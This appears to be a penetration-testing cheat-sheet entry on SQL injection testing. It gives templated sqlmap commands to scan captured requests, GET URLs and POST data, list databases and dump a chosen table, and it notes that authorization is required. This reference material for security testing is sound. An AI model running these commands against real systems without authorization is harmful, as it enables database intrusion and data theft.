---
technique: SQL Injection Testing
category: injection
targets: Web Applications, APIs
protocols: HTTP, SQL
remote_capable: true
tags: web sql-injection sqlmap injection
---

# SQL Injection Testing

SQL injection testing checks whether user-controlled inputs reach database queries and whether data extraction or file primitives are available.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Request | Captured requests preserve cookies, headers, and body data |
| Scope | Data extraction must stay within authorized targets |
| Risk | Higher sqlmap risk and level increase request volume |

## Linux

### Request scan

#sh #sqlmap #sqli

Run sqlmap against a captured request.

```sh title:"Run sqlmap against captured request"
sqlmap -r "$request_file" --batch
```
<!-- cheat
var request_file
-->

### GET scan

#sh #sqlmap #sqli

Run sqlmap against a URL.

```sh title:"Run sqlmap against GET URL"
sqlmap -u "$url" --batch
```
<!-- cheat
var url
-->

### POST scan

#sh #sqlmap #sqli

Run sqlmap against POST data.

```sh title:"Run sqlmap against POST data"
sqlmap -u "$url" --data "$params" --batch
```
<!-- cheat
var url
var params
-->

### List databases

#sh #sqlmap #sqli

Enumerate databases.

```sh title:"Enumerate databases with sqlmap"
sqlmap -r "$request_file" --batch --dbs
```
<!-- cheat
var request_file
-->

### Dump table

#sh #sqlmap #sqli

Dump a specific table.

```sh title:"Dump SQL table with sqlmap"
sqlmap -r "$request_file" --batch -D "$database" -T "$table" --dump
```
<!-- cheat
var request_file
var database
var table
-->
